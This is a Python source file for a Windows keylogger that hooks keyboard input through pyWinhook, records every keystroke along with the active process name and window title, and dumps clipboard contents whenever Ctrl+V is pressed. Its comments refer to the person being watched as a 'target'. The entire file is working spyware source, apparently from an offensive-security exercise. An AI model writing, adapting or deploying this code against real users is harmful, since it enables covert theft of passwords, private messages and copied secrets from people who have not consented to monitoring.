#!/usr/bin/env python3

import pythoncom
import pyWinhook
# ^ same api as pyHook ^
# import pyHook <- very old, not maintained?
import win32clipboard
from ctypes import *

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    """
    get proc info so we can write logs that make more sense and have context
    """

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # get the pid object
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process id
    process_id = int(pid.value)

    # grab the executable
    executable = create_string_buffer(b'\x00' * 512)
    h_process = kernel32.OpenProcess(0x400| 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable), 512)

    # Now read its title
    window_title = create_string_buffer(b'\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # print header if we are in the correct process
    print(f'[pid]: {process_id} - {executable.value.decode()} - {window_title.value.decode()}')

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    """
    grab dem keystrokes
    """
    global current_window

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if standard keypress
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end='')
    else:
        # if CTRL + V get value of clipboard
        if event.Key == 'V':

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print(f'[paste] - {pasted_value}'),

        else:

            print(f'[{event.Key}]')

    # pass execution to next hook registered
    return True

def main():
    get_current_process()

    # create and register hook mgr
    kl = pyWinhook.HookManager()
    kl.KeyDown = KeyStroke

    # register hook, execute forever
    kl.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()
